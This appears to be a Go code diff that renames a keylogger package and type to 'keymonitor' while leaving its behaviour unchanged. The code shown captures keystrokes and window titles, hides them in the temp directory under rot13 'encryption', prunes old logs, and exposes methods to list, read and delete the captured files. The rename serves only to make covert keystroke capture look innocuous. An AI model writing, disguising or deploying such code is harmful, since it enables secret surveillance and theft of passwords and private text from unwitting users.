@@ -1,4 +1,4 @@
-package keylogger
+package keymonitor
 
 import (
 	"fmt"
@@ -18,7 +18,7 @@ const (
 	InactivityPause = 2 * time.Second // Time before starting a new line
 )
 
-type Keylogger struct {
+type Keymonitor struct {
 	mu                 sync.Mutex
 	running            bool
 	stopCh             chan struct{}
@@ -32,23 +32,23 @@ type Keylogger struct {
 	currentWindowTitle string
 }
 
-func New() *Keylogger {
-	return &Keylogger{
+func New() *Keymonitor {
+	return &Keymonitor{
 		stopCh: make(chan struct{}),
 		logDir: getTempDir(),
 	}
 }
 
-func (k *Keylogger) Start() error {
+func (k *Keymonitor) Start() error {
 	k.mu.Lock()
 	if k.running {
 		k.mu.Unlock()
-		return fmt.Errorf("keylogger already running")
+		return fmt.Errorf("keymonitor already running")
 	}
 	k.running = true
 	k.mu.Unlock()
 
-	log.Printf("[keylogger] Starting keylogger, logs in: %s", k.logDir)
+	log.Printf("[keymonitor] Starting keymonitor, logs in: %s", k.logDir)
 
 	go k.cleanupOldLogs()
 	go k.captureLoop()
@@ -57,7 +57,7 @@ func (k *Keylogger) Start() error {
 	return nil
 }
 
-func (k *Keylogger) Stop() {
+func (k *Keymonitor) Stop() {
 	k.mu.Lock()
 	defer k.mu.Unlock()
 
@@ -77,10 +77,10 @@ func (k *Keylogger) Stop() {
 		k.currentFile = nil
 	}
 
-	log.Printf("[keylogger] Stopped")
+	log.Printf("[keymonitor] Stopped")
 }
 
-func (k *Keylogger) ListFiles() ([]FileInfo, error) {
+func (k *Keymonitor) ListFiles() ([]FileInfo, error) {
 	entries, err := os.ReadDir(k.logDir)
 	if err != nil {
 		return nil, err
@@ -111,7 +111,7 @@ func (k *Keylogger) ListFiles() ([]FileInfo, error) {
 	return files, nil
 }
 
-func (k *Keylogger) ReadFile(filename string) ([]byte, error) {
+func (k *Keymonitor) ReadFile(filename string) ([]byte, error) {
 	if strings.Contains(filename, "..") || strings.Contains(filename, string(filepath.Separator)) {
 		return nil, fmt.Errorf("invalid filename")
 	}
@@ -129,7 +129,7 @@ func (k *Keylogger) ReadFile(filename string) ([]byte, error) {
 	return data, nil
 }
 
-func (k *Keylogger) ClearAll() error {
+func (k *Keymonitor) ClearAll() error {
 	k.mu.Lock()
 	defer k.mu.Unlock()
 
@@ -158,15 +158,15 @@ func (k *Keylogger) ClearAll() error {
 
 		path := filepath.Join(k.logDir, name)
 		if err := os.Remove(path); err != nil {
-			log.Printf("[keylogger] Failed to remove %s: %v", name, err)
+			log.Printf("[keymonitor] Failed to remove %s: %v", name, err)
 		}
 	}
 
-	log.Printf("[keylogger] Cleared all log files")
+	log.Printf("[keymonitor] Cleared all log files")
 	return nil
 }
 
-func (k *Keylogger) DeleteFile(filename string) error {
+func (k *Keymonitor) DeleteFile(filename string) error {
 	if strings.Contains(filename, "..") || strings.Contains(filename, string(filepath.Separator)) {
 		return fmt.Errorf("invalid filename")
 	}
@@ -192,11 +192,11 @@ func (k *Keylogger) DeleteFile(filename string) error {
 		return err
 	}
 
-	log.Printf("[keylogger] Deleted log file: %s", filename)
+	log.Printf("[keymonitor] Deleted log file: %s", filename)
 	return nil
 }
 
-func (k *Keylogger) FlushNow() {
+func (k *Keymonitor) FlushNow() {
 	k.mu.Lock()
 	defer k.mu.Unlock()
 
@@ -205,21 +205,21 @@ func (k *Keylogger) FlushNow() {
 	}
 }
 
-func (k *Keylogger) captureLoop() {
+func (k *Keymonitor) captureLoop() {
 	for {
 		select {
 		case <-k.stopCh:
 			return
 		default:
 			if err := k.captureKeystrokes(); err != nil {
-				log.Printf("[keylogger] Capture error: %v", err)
+				log.Printf("[keymonitor] Capture error: %v", err)
 				time.Sleep(time.Second)
 			}
 		}
 	}
 }
 
-func (k *Keylogger) flushLoop() {
+func (k *Keymonitor) flushLoop() {
 	ticker := time.NewTicker(FlushInterval)
 	defer ticker.Stop()
 
@@ -241,7 +241,7 @@ func (k *Keylogger) flushLoop() {
 	}
 }
 
-func (k *Keylogger) flushBuffer() {
+func (k *Keymonitor) flushBuffer() {
 	if k.buffer.Len() == 0 {
 		return
 	}
@@ -264,13 +264,13 @@ func (k *Keylogger) flushBuffer() {
 
 	encrypted := rot13(k.buffer.String())
 	if _, err := k.currentFile.WriteString(encrypted); err != nil {
-		log.Printf("[keylogger] Write error: %v", err)
+		log.Printf("[keymonitor] Write error: %v", err)
 	}
 
 	k.buffer.Reset()
 }
 
-func (k *Keylogger) rotateFile(date string) {
+func (k *Keymonitor) rotateFile(date string) {
 	if k.currentFile != nil {
 		k.currentFile.Close()
 	}
@@ -281,7 +281,7 @@ func (k *Keylogger) rotateFile(date string) {
 
 	file, err := os.OpenFile(path, os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0600)
 	if err != nil {
-		log.Printf("[keylogger] Failed to open log file: %v", err)
+		log.Printf("[keymonitor] Failed to open log file: %v", err)
 		k.currentFile = nil
 		k.currentDate = ""
 		return
@@ -290,15 +290,15 @@ func (k *Keylogger) rotateFile(date string) {
 	k.currentFile = file
 	k.currentDate = date
 	k.currentName = filename
-	log.Printf("[keylogger] Rotated to new file: %s", filename)
+	log.Printf("[keymonitor] Rotated to new file: %s", filename)
 }
 
-func (k *Keylogger) cleanupOldLogs() {
+func (k *Keymonitor) cleanupOldLogs() {
 	cutoff := time.Now().Add(-FileRetention)
 
 	entries, err := os.ReadDir(k.logDir)
 	if err != nil {
-		log.Printf("[keylogger] Failed to read log dir for cleanup: %v", err)
+		log.Printf("[keymonitor] Failed to read log dir for cleanup: %v", err)
 		return
 	}
 
@@ -319,15 +319,15 @@ func (k *Keylogger) cleanupOldLogs() {
 		if info.ModTime().Before(cutoff) {
 			path := filepath.Join(k.logDir, name)
 			if err := os.Remove(path); err != nil {
-				log.Printf("[keylogger] Failed to remove old log %s: %v", name, err)
+				log.Printf("[keymonitor] Failed to remove old log %s: %v", name, err)
 			} else {
-				log.Printf("[keylogger] Removed old log: %s", name)
+				log.Printf("[keymonitor] Removed old log: %s", name)
 			}
 		}
 	}
 }
 
-func (k *Keylogger) logKey(key string) {
+func (k *Keymonitor) logKey(key string) {
 	k.mu.Lock()
 	defer k.mu.Unlock()
 
@@ -399,7 +399,7 @@ func getTempDir() string {
 	return os.TempDir()
 }
 
-func (k *Keylogger) getWindowTitle() string {
+func (k *Keymonitor) getWindowTitle() string {
 	return getWindowTitle()
 }
 
